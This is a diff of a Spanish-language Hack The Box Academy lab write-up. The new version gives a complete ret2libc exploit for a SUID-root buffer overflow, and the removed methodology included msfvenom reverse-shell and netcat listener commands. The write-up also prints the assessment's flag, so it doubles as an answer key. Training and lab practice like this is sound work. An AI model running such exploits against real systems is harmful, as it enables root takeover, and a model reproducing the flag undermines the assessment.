@@ -2,114 +2,145 @@
 
 La evaluación práctica pone a prueba todos los conceptos aprendidos en el módulo.
 
-## Objetivos
+## Escenario
 
-1. Identificar vulnerabilidad de buffer overflow
-2. Determinar el offset exacto
-3. Identificar bad characters
-4. Generar shellcode funcional
-5. Obtener acceso al sistema
+Accedimos por SSH a una máquina Linux con un usuario estándar `htb-student` que puede dejar mensajes usando un programa SUID root llamado `leave_msg`.
 
-## Metodología
+## Objetivo
 
-### Paso 1: Análisis Inicial
+Explotar un Stack-Based Buffer Overflow para leer `/root/flag.txt`.
+
+## Paso 1: Análisis del Binario
 
 ```bash
-file <binary>
-strings <binary>
-gdb -q <binary>
+file /home/htb-student/leave_msg
 ```
 
-### Paso 2: Identificar Función Vulnerable
-
-```bash
-(gdb) disassemble main
-(gdb) disassemble <funcion>
+**Resultado:**
+```
+setuid ELF 32-bit LSB shared object, Intel 80386
 ```
 
-### Paso 3: Determinar Offset
+| Propiedad | Valor |
+|-----------|-------|
+| Archivo | ELF 32-bit |
+| SUID | root |
+| Arquitectura | x86 |
+
+## Paso 2: Determinar Offset
 
 ```bash
-# Crear patrón
-pattern_create.rb -l 2000
-
-# Ejecutar y obtener EIP
-(gdb) run $(cat pattern.txt)
+gdb -q /home/htb-student/leave_msg
+(gdb) run $(python3 -c "print('A' * 2060 + 'BBBB')")
 (gdb) info registers eip
-
-# Calcular offset
-pattern_offset.rb -q 0x<eip_value>
 ```
 
-### Paso 4: Bad Characters
+**Resultado:**
+```
+eip    0x42424242    0x42424242
+```
+
+**Offset = 2060 bytes**
+
+## Paso 3: Stack Size
 
 ```bash
-# Crear lista de todos los bytes
-# Enviar payload con CHARS
-# Examinar stack para encontrar roturas
-(gdb) x/500xb $esp+offset
+(gdb) info proc mappings
 ```
 
-### Paso 5: Generar Shellcode
+**Resultado:**
+```
+Start Addr   End Addr       Size
+0xfffdc000 0xffffe000    0x22000  [stack]
+```
+
+**Stack Size = 0x22000**
+
+## Paso 4: Ret2libc Exploit
+
+### Encontrar Direcciones
 
 ```bash
-msfvenom -p linux/x86/shell_reverse_tcp \
-  LHOST=<IP> LPORT=<PORT> \
-  --arch x86 --platform linux \
-  --bad-chars "<bad_chars>" \
-  -f c
+# Dirección de system
+(gdb) p system
+$1 = {<text variable, no debug info>} 0xf7e29e10 <system>
+
+# Offset de /bin/sh en libc
+strings -a -t x /lib32/libc-2.27.so | grep /bin/sh
+17b88f /bin/sh
+
+# Ret gadget en libc
+python3 -c "data = open('/lib32/libc-2.27.so', 'rb').read(); print(hex(data.find(b'\\xc3')))"
+0x417
 ```
 
-### Paso 6: Encontrar Return Address
+### Calcular Direcciones
+
+```
+libc_base = 0xf7ded000
+system    = 0xf7e29e10
+/bin/sh   = libc_base + 0x17b88f = 0xf7f6888f
+ret       = libc_base + 0x417 = 0xf7ded417
+```
+
+### Exploit Final
+
+```python
+import struct
+import sys
+
+# Padding hasta EIP
+padding = b"A" * 2060
+
+# Direcciones
+libc_base = 0xf7ded000
+system_addr = 0xf7e29e10
+binsh_addr = libc_base + 0x17b88f  # 0xf7f6888f
+exit_addr = libc_base + 0x3d0b0
+
+# Payload ret2libc
+payload = padding
+payload += struct.pack("<I", system_addr)  # EIP -> system
+payload += struct.pack("<I", exit_addr)    # return address (exit)
+payload += struct.pack("<I", binsh_addr)   # argumento: /bin/sh
+
+sys.stdout.buffer.write(payload)
+```
+
+### Ejecución
 
 ```bash
-(gdb) run $(python -c 'print "<payload>"')
-(gdb) info registers esp
-(gdb) x/200xb $esp
+/home/htb-student/leave_msg $(python3 exploit.py)
+# cat /root/flag.txt
+HTB{wmcaJe4dEFZ3pbgDEpToJxFwvTEP4t}
 ```
 
-### Paso 7: Exploit Final
+## Flag
 
-```bash
-# Listener
-nc -lvnp <PORT>
-
-# Ejecutar exploit
-./<binary> $(python exploit.py)
+```
+HTB{wmcaJe4dEFZ3pbgDEpToJxFwvTEP4t}
 ```
 
-## Checklist de Éxito
+## Estructura del Payload
 
-| Tarea | Completado |
-|-------|------------|
-| Offset identificado | [ ] |
-| Bad characters encontrados | [ ] |
-| Shellcode generado | [ ] |
-| Return address calculada | [ ] |
-| Reverse shell obtenida | [ ] |
+| Componente | Tamaño | Contenido |
+|------------|--------|-----------|
+| Padding | 2060 bytes | "A" * 2060 |
+| EIP | 4 bytes | system() address |
+| Return | 4 bytes | exit() address |
+| Argumento | 4 bytes | /bin/sh address |
 
-## Comandos Clave
+## Resumen
 
-| Comando | Propósito |
-|---------|-----------|
-| `pattern_create.rb -l N` | Crear patrón único |
-| `pattern_offset.rb -q ADDR` | Calcular offset |
-| `msfvenom -p ...` | Generar shellcode |
-| `x/Nxb $esp` | Examinar stack |
-| `info registers eip` | Ver EIP |
-| `nc -lvnp PORT` | Listener netcat |
+| Parámetro | Valor |
+|-----------|-------|
+| File type | ELF 32-bit |
+| Offset | 2060 bytes |
+| Stack size | 0x22000 |
+| Vulnerabilidad | strcpy sin bounds check |
+| Técnica | Ret2libc |
+| Flag | HTB{wmcaJe4dEFZ3pbgDEpToJxFwvTEP4t} |
 
-## Troubleshooting
+## Achievement
 
-| Problema | Solución |
-|----------|----------|
-| EIP no sobrescrito | Aumentar tamaño del buffer |
-| Shellcode no ejecuta | Verificar bad chars |
-| Conexión rechazada | Verificar firewall/LPORT |
-| Crash sin shell | Verificar return address |
-
-## Recursos
-
-- [Exploit Database](https://www.exploit-db.com/)
-- [Metasploit Framework](https://www.metasploit.com/)
-- [Shell Storm](http://shell-storm.org/shellcode/)
+https://academy.hackthebox.com/achievement/2300153/31
